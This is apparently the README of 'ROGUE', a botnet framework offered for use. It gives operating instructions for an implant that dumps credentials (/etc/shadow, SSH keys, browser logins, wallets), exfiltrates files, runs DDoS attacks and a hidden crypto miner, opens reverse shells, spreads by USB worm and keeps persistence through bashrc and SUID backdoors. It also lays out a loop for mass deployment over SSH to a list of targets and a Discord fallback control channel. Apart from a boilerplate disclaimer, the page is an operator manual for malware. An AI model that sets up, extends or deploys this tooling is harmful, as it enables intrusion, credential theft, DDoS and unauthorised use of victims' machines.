# ROGUE - Encrypted Botnet Framework

![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)

## Overview

ROGUE is a sophisticated encrypted command-and-control framework designed for authorized security testing and research. It features AES-256 encryption, web-based administration, Discord fallback channels, and autonomous propagation capabilities.

---

## Features

### Core Capabilities
- **AES-256 Encrypted Communications** - Secure command and exfiltration channels
- **Web-Based Administration** - Full-featured GUI control panel
- **Dual C2 Channels** - HTTPS primary with Discord fallback
- **Ngrok HTTPS Tunneling** - Zero-port-forwarding deployment
- **Peer-to-Peer Bot Communication** - Bot coordination when C2 is offline
- **Process Stealth** - Masquerades as system daemons

### Payload Arsenal
- **PolyRoot Persistence** - Privilege escalation and SUID backdoors
- **DDoS Module** - Multi-vector attack capabilities
- **Cryptocurrency Miner** - Silent mining operations
- **Credential Dumper** - Automated credential collection
- **File Exfiltration** - Encrypted data extraction

### Propagation & Persistence
- **USB Worm Logic** - Auto-infects removable drives
- **Bashrc Persistence** - Survives reboots
- **Hidden Execution** - Runs from `.cache/.rogue/` directory
- **Cross-Platform Ready** - Linux/Raspberry Pi focused

---

## Installation

### Clone Repository
```bash
git clone https://github.com/ekomsSavior/rogue.git
cd rogue
```

### Install Dependencies
```bash
sudo apt update
sudo apt install python3 python3-pip python3-dev -y
pip3 install pycryptodome flask requests
```

### Ngrok Setup
```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/

ngrok config add-authtoken YOUR_AUTH_TOKEN
```
---

## Quick Start

### 1. Start C2 Server
```bash
python3 rogue_c2.py
```

The server will:
- Start ngrok HTTPS tunnel
- Launch Flask C2 on port 4444
- Start exfiltration listener (port 9090)
- Start reverse shell listener (port 9001)
- Display admin panel at `http://localhost:4444/admin`

### 2. Configure Implant
Edit `rogue_implant.py` with your ngrok URL:
```python
C2_HOST = 'your-ngrok-subdomain.ngrok-free.dev'
PAYLOAD_REPO = "https://your-ngrok-subdomain.ngrok-free.dev/payloads/"
```

### 3. Deploy Implant
Run on target system:
```bash
python3 rogue_implant.py
```

---

## Web GUI Administration



### Accessing the Control Panel
After starting the C2 server, ACCESS THE WEB INTERFACE at:

```
http://localhost:4444/admin
```

![IMG_0824(1)](https://github.com/user-attachments/assets/ce6b60e8-294c-444b-95b0-130379f7a96b)


### GUI Features
- **Real-time Bot Monitoring** - View all connected implants
- **Command Queue Management** - Send commands to individual or all bots
- **Result History** - View command outputs and exfiltration results
- **Quick Command Buttons** - Common operations with one click
- **Server Status Dashboard** - Monitor C2 server health and connections

### Using the Web Interface
1. **View Connected Bots** - See all active implants with their IP addresses and last check-in times
2. **Send Commands** - Use the command forms to execute shell commands or trigger payloads
3. **Monitor Results** - View command outputs in the results section
4. **Manage Payloads** - Access payload repository from the server status section

![IMG_0822](https://github.com/user-attachments/assets/55170877-90c7-4c20-9dce-771d9a24fb85)

---

## Encryption & Security

### AES-256 Encryption
All C2 communications are encrypted with AES-256 in EAX mode. Separate keys are used for command channels and exfiltration data. The system includes SSL/TLS bypass for ngrok compatibility.

### Stealth Features
- Process name masquerading (appears as `systemd-journald`)
- Hidden directory operation (`~/.cache/.rogue/`)
- Discord fallback for NAT/Firewall bypass scenarios
- P2P bot communication as backup channel

---

## Payload Modules

### PolyRoot Persistence
```bash
# Trigger from C2
trigger_stealthinject

# Manual execution
python3 payloads/polyloader.py
```
- Attempts privilege escalation via SUID binaries
- Drops persistent backdoor
- Auto-connects reverse shell to C2

### DDoS Module
```bash
# C2 Command via Web GUI
trigger_ddos <target_ip> <port> <duration>

# Manual execution
python3 payloads/ddos.py 192.168.1.100 80 300 http
```
**Attack Modes:** `http`, `tls`, `udp`, `tcp`, `slowpost`, `combo`

### Credential Exfiltration
```bash
trigger_dumpcreds
```
Collects system credentials including:
- `/etc/passwd`, `/etc/shadow`
- SSH keys from `~/.ssh/`
- Browser credentials
- Wallet files

### File Exfiltration
```bash
trigger_exfil /path/to/folder
trigger_exfil default  # Common directories
trigger_exfil deep     # Deep system scan
```

---

## USB Worm Propagation

### How It Works
When `rogue_implant.py` detects a USB drive:
1. Monitors `/media/`, `/run/media/`, `/mnt/` for new mounts
2. Copies itself to USB as hidden payload
3. Creates autorun scripts (`.bash_login`)
4. Infects new systems when USB is plugged in

### Infected USB Structure
```
USB Drive/
├── .rogue_worm/          # Hidden worm directory
│   ├── rogue_implant.py  # Main implant
│   └── .bash_login       # Auto-execute script
└── readme.txt           # Decoy file
```

---

## Command Reference

### Basic Commands (via Web GUI)
```bash
whoami                    # System information
ls -la /home              # List user directories
ip a                      # Network configuration
ps aux                    # Running processes
```

### Payload Management
```bash
load_payload polyloader.py    # Download payload
run_payload polyloader.py     # Execute payload
trigger_mine                   # Start crypto miner
trigger_stopmine              # Stop miner
```

### Advanced Operations
```bash
reverse_shell                 # Initiate reverse shell (port 9001)
trigger_dumpcreds             # Dump and exfil credentials
trigger_exfil /etc            # Exfiltrate specific directory
trigger_ddos 1.2.3.4 80 60   # DDoS attack (60 seconds)
```

---

## Discord C2 Setup (Fallback Channel)

### Configuration
Edit the Discord settings in `rogue_implant.py`:
```python
DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
```

### Discord Bot Setup
1. Visit Discord Developer Portal and create new application
2. Add bot with Message Content Intent enabled
3. Copy bot token and channel ID
4. Create webhook in your Discord channel

### How Discord Fallback Works
- Implant checks Discord channel every 30 seconds for commands
- Commands posted in Discord are executed on all implants
- Results are encrypted and sent back via webhook
- Provides C2 redundancy when primary HTTPS channel is unavailable

---

## Targeting & Deployment

### Linux Systems
```bash
# Single target deployment
scp rogue_implant.py user@target:/tmp/
ssh user@target "python3 /tmp/rogue_implant.py"

# Mass deployment via SSH
for ip in $(cat targets.txt); do
    scp rogue_implant.py user@$ip:/tmp/
    ssh user@$ip "python3 /tmp/rogue_implant.py &"
done
```

### Persistence Methods
1. **Bashrc Injection** - Auto-starts on user login
2. **Systemd Service** - Runs as background service (planned)
3. **Cron Jobs** - Scheduled execution
4. **SUID Backdoor** - Privileged persistence via polyroot

---

## Troubleshooting

### Common Issues

**Ngrok 404 Errors**
```bash
# Ensure ngrok is running
ps aux | grep ngrok

# Restart ngrok
pkill ngrok
ngrok http 4444
```

**Implant Not Connecting**
```bash
# Check C2_HOST in implant matches ngrok URL
# Verify payloads directory exists
ls payloads/

# Test payload delivery
curl https://your-ngrok.ngrok-free.dev/payloads/polyloader.py
```

**Web GUI Not Accessible**
```bash
# Check Flask is running on port 4444
netstat -tlnp | grep 4444

# Verify no firewall blocking
sudo ufw status
```

### Log Locations
- **C2 Logs**: Console output + Flask logs
- **Implant Logs**: Console output on target systems
- **Exfil Data**: `exfil_dec_*.zip` files in C2 directory
- **Payloads**: `~/.cache/.rogue/` on infected systems

---

## Legal & Ethical Use

### DISCLAIMER
This tool is for:
- Educational purposes only
- Authorized security testing
- Research and development
- Penetration testing with explicit permission

### LEGAL REQUIREMENTS
1. Only test on systems you own or have written permission to test
2. Comply with all applicable laws and regulations
3. Do not use for malicious purposes
4. Assume full responsibility for your actions

---
  
For educational purposes only. Use responsibly.

<img width="1151" height="1360" alt="roguerogue" src="https://github.com/user-attachments/assets/d8c0e482-efa0-4f43-86dc-bf8e15505520" />


